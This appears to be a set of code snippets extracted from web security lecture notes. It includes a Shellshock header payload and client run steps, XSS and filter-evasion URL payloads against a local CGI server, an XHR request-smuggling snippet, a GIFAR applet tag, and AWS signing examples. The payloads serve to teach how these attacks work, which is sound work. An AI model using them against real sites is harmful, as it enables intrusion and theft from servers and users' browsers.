["```\nGET /query.cgi?searchTerm=cats HTTP 1.1\nHost: www.example.com\nCustom-header: Custom-value \n```", "```\n() { :;};  /bin/id \n```", "```\nStep 1: Run the CGI server.\n  ./victimwebserver.py 8082\n\nStep 2: Run the exploit script.\n  ./shellshockclient.py localhost:8082 index.html \n```", "```\nStep 1: Run the CGI server.\n   ./cgiServer.py\n\nStep 2: In browser, load these URLs:\n   http://127.0.0.1:8282/cgi-bin/uploadRecv.py?msg=hello\n   http://127.0.0.1:8282/cgi-bin/uploadRecv.py?msg=<b>hello</b>\n   http://127.0.0.1:8282/cgi-bin/uploadRecv.py?msg=<script>alert(\"XSS\");</script>\n           //The XSS attack doesn't work for this one . . .\n           //we'll see why later in the lecture.\n\n   http://127.0.0.1:8282/cgi-bin/uploadRecv.py?msg=<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">\n\n           //This works! [At least on Chrome 37.0.2062.124.]\n           //Even though the browser caught the\n           //straightforward XSS injection, it\n           //incorrectly parsed our intentionally\n           //malformed HTML.\n           // [For more examples of XSS exploits via\n           //  malformed code, go here:\n           //      https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet\n           // ] \n```", "```\n        Content-Security-Policy: default-src 'self' *.mydomain.com\n        // Only allow content from the page's domain\n        // and its subdomains. \n        ```", "```\n             GET /photos/cat.jpg HTTP/1.1\n             Host: johndoe.s3.amazonaws.com\n             Date: Mon, 26 Mar 2007 19:37:58 +0000\n             Authorization: AWS AKIAIOSFODNN7EXAMPLE:frJIUN8DYpKDtOLCwoyllqDzg=\n                              |___________________| |________________________|\n                                  Access key ID            MAC signature \n            ```", "```\n             StringToSign = \n                  HTTP-Verb     + \"\\n\" +\n                  Content-MD5   + \"\\n\" +\n                  Content-Type  + \"\\n\" +\n                  Date          + \"\\n\" +\n                  ResourceName \n            ```", "```\n             AWSAccessKeyId=AKIAIOSFODNN7EXAMPLE&Expires=1141889120&Signature=vjbyPxybd...\n                                               |__________________|\n                                              Included in the string\n                                              that's covered by the\n                                              signature! \n            ```", "```\n         var x = new XMLHttpRequest();\n         x.open(\"GET\", \"http://foo.com\");\n         x.setRequestHeader(\"Content-Length\", \"7\");\n\n         // Overrides the browser-computed field!\n         x.send(\"Gotcha!\\r\\n\" +\n         \"GET /something.html HTTP/1.1\\r\\n\" +\n         \"Host: bar.com\"); \n        ```", "```\n             <applet code=\"attacker.class\"\n                    archive=\"attacker.gif\"\n                    ...> \n            ```"]